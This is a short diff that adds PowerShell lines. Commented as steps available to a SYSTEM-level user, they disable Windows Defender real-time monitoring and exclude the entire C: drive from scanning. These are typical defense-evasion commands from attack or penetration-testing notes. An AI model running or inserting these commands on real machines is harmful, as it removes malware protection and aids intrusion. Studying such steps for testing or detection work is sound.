@@ -1,0 +1,4 @@
+# As SYSTEM, Defender can be disabled
+Set-MpPreference -DisableRealtimeMonitoring $true
+# Or exclude entire directories
+Add-MpPreference -ExclusionPath "C:\"
